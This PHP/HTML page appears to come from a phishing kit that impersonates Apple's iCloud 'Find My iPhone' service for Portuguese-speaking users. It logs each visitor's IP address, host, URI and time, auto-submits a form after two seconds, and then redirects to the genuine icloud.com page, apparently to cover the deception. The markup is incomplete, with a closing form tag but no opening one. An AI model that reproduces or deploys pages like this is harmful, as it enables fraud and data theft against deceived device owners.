<?php

date_default_timezone_set('America/Sao_Paulo');
$prazo = 1;
$data_vencimento = date('d/m/Y', strtotime('+'.$prazo.' days'));
$data_documento = date('d/m/Y');
$numero22 = rand(10000000, 90000000);
$url2 = $_SERVER['HTTP_HOST']; 
$url1 = $_SERVER['REQUEST_URI'];
$hora = date("H:i:s");
$ip = $_SERVER["REMOTE_ADDR"];
?>

<!DOCTYPE html>
<html lang="pt-br">
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
<meta charset="UTF-8">
<meta http-equiv="refresh" content="15;URL=https://www.icloud.com/find">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">

<link rel="stylesheet" type="text/css" href="css/style1.css">
<script type="text/javascript" src="scripts/html5shiv.js"></script>
<script language="JavaScript">
function direcionar() { document.form.submit(); }
 
</script>
<meta name="RATING" content="RTA-5042-1996-1400-1577-RTA" /></head>

<body style="margin:0;" onLoad="setTimeout('direcionar()',2000);">

<input type="hidden" name="br" id="br" value="">
<div style="margin:10px 0 0 0; color:# 000000; font-family:'Arial'; font-size:13px; text-align:center;">Buscando Seu iPhone...</div>

<img src="../assets/img/logo.png" id="centro" />

</form>
</div>
